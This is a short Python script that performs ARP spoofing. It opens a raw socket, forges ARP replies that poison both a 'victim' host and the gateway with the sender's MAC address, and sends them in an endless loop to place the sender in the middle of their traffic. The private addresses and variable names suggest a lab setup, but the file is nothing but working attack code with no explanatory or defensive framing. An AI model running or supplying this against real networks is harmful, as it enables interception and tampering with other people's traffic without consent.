import socket
import struct 

s = socket.socket(socket.PF_PACKET, socket.SOCK_RAW, socket.htons(0x0003))
s.bind(("ens33", socket.htons(0x0003)))

sor = b'\x00\x50\x56\x29\x6c\x85'
victmac = b"\x00\x0c\x29\xdb\x9a\xb2"

gatemac = b"\x00\x50\x56\xc0\x00\x02"
code = b'\x08\x06'
eth1 = victmac+ sor+code # dest+ sor+code 
eth2 = gatemac+sor+code  

htype = b'\x00\x01'
protype = b'\x08\x00'
hsize = b'\x06'
psize = b'\x04'
opcode = b'\x00\x02'

gateip = '192.168.21.1'
victim_ip = '192.168.21.141'
gip = socket.inet_aton(gateip)
vip = socket.inet_aton(victim_ip)
arp_victim = eth1+htype+protype+hsize+psize+opcode+sor+gip+victmac+vip 
arp_gateway = eth2+htype+protype+hsize+psize+opcode+sor+vip+gatemac+gip  

while True :
	s.send(arp_victim)
	s.send(arp_gateway)




